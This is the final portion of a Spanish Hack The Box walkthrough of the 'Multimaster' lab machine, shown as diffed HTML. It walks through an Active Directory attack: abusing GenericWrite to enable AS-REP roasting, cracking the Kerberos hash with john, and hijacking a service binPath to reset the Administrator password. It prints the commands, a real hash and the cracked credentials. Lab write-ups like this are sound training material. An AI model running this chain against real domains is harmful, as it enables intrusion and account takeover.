+2023-04-02T09:45:51.9916814-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+
+*Evil-WinRM* PS C:\WIndows\Temp\Privesc&gt; dir
+
+
+    Directory: C:\WIndows\Temp\Privesc
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         4/2/2023   9:47 AM          14062 20230402094551_BloodHound.zip
+-a----         8/3/2022   9:21 AM        1060864 SharpHound.exe
+-a----         4/2/2023   9:47 AM          13225 YThiODEyNWUtMTcwMC00YWY2LTgwZmYtNmIxMWU0MTM4ZDg5.bin
+</code></pre>
+
+<p>Subimos el <code>.zip</code> a bloodhound</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Multimaster/multi8.PNG" alt="" /></p>
+
+<p>marcamos al usuario <code>sbauer</code> como <code>User as owned</code> y en analisys pinchamos en la opcion <code>Shortest Paths form Owned Principals</code></p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Multimaster/multi11.PNG" alt="" /></p>
+
+<p>Observamos que el usuario <code>sbauer</code> tiene el privilegio <code>Generic Write</code> sobre el usuario <code>Jorden</code> quien a su vez forma parte del grupo <code>Server Operators</code></p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Multimaster/multi12.PNG" alt="" /></p>
+
+<blockquote>
+  <p>GenericWrite - actualizar los atributos del objeto (por ejemplo, script de inicio de sesión)</p>
+</blockquote>
+
+<p>Aprovecharemos el <code>Generic Write</code> para setear la propiedad <code>dont require Kerberos preauthentication</code> y con esto hacer al usuario <code>ASREPRoasteable</code></p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\Windows\Temp\Privesc&gt; Get-Aduser jorden | Set-ADAccountControl  -doesnotrequirepreauth $true
+</code></pre>
+
+<p>Con<code>GetNPUsers.py</code> esta vez si podamos obtener el hash</p>
+
+<pre><code class="language-bash">❯ GetNPUsers.py MEGACORP.LOCAL/ -no-pass -usersfile users.txt
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[-] User tushikikatomo doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User lana doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User andrew doesn't have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$23$jorden@MEGACORP.LOCAL:8e7ea2a50a1602c925cf681fca176a58$a2a1627ed23fe85bdadc88c1a0b551f0ee10dfe43f7677fc6f1204e36d5e849c95932313e7fae6b9829be5d69f243279f32098db2118abef962bb1b7fa2caafe91ca22d2747690dea014ecc6e9f95e2dffdd8acac823f47c7e29a834cf910daa4cbdc19187bbf95d436e083a050e274fd15905b15f58c2e9cc23932efcac112a2adf3a59fd3de0342d4d35e33f7da5aeb2be18db5aa625a95adbde5c075843711be01945177e8fd7935c8edc5355ee98fce7b9d4becbc72e14606e5c4df3b1577f19b621457089150499cf8a79616110fe973d7e63bbde78641380be90733b621190a13c13968c6ed3d2d9ea85bf9603
+[-] User sbauer doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User okent doesn't have UF_DONT_REQUIRE_PREAUTH set
+</code></pre>
+
+<p>Procedamos a crackearlo con <code>john</code> y nos devuelve la contraseña en texto claro.</p>
+
+<pre><code class="language-bash">❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+rainforest786    ($krb5asrep$23$jorden@MEGACORP.LOCAL)
+1g 0:00:00:06 DONE (2023-04-02 17:01) 0.1550g/s 682666p/s 682666c/s 682666C/s rainian..railezs05
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+</code></pre>
+
+<p>Nos conectamos nuevamente con <code>evil-winrm</code> y hubieramos migrado al usuario <code>jorden</code></p>
+
+<pre><code class="language-powershell">❯ evil-winrm -i 10.10.10.179 -u 'jorden' -p 'rainforest786'
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\jorden\Documents&gt; whoami
+megacorp\jorden
+</code></pre>
+
+<p>Antes vimos que este usuario formaba parte del grupo <code>Server Operators</code>, aprovecharemos esto para cambiar la propiedad <code>binpath</code> de un proceso el cual el forzaremos a desactivarse y al iniciarlo nuevamente nos ejecutara la sentencia que hayamos puesto.</p>
+
+<p>Cambiaremos el <code>binPath</code> del proceso <code>browser</code> para que al volver a iniciarse nos cambie la contraseña del usuario <code>Administrator</code>.</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\Users\jorden\Documents&gt; sc.exe config browser binPath="C:\Windows\System32\cmd.exe /c net user Administrator fmiracle123$!"
+[SC] ChangeServiceConfig SUCCESS
+*Evil-WinRM* PS C:\Users\jorden\Documents&gt; sc.exe stop browser
+
+SERVICE_NAME: browser
+        TYPE               : 20  WIN32_SHARE_PROCESS
+        STATE              : 3  STOP_PENDING
+                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x1
+        WAIT_HINT          : 0xafc8
+*Evil-WinRM* PS C:\Users\jorden\Documents&gt; sc.exe start browser
+[SC] StartService FAILED 1053:
+
+The service did not respond to the start or control request in a timely fashion.
+</code></pre>
+
+<p>Verificamos y efectivamente cambiamos las claves del usuario <code>Administrator</code></p>
+
+<pre><code class="language-bash">❯ crackmapexec smb 10.10.10.179 -u 'Administrator' -p 'fmiracle123$!'
+SMB         10.10.10.179    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
+SMB         10.10.10.179    445    MULTIMASTER      [+] MEGACORP.LOCAL\Administrator:fmiracle123$! (Pwn3d!)
+</code></pre>
+
+<p>Lo siguiente sera conectarnos, ir al directorio personal del usuario y visualizar la segunda flag <code>root.txt</code></p>
+
+<pre><code class="language-powershell">❯ evil-winrm -i 10.10.10.179 -u 'Administrator' -p 'fmiracle123$!'
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ..\Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt
+559ca9f9c145bc76f8504391a74710cc
+</code></pre>
+
+<p>y listo maquina pwneada!!</p>
+
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        ⚉
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=Maquina - Multimaster&url=http://localhost:4000/hackthebox/htb-writeup-Multimaster" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/1014319" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/Firtsmiracle" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+
+    </div>
+
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Jekyll Theme by</a> WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+<!-- Bootstrap and images ZOOM feature
+================================================== -->
+<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+
+</body>
+</html>
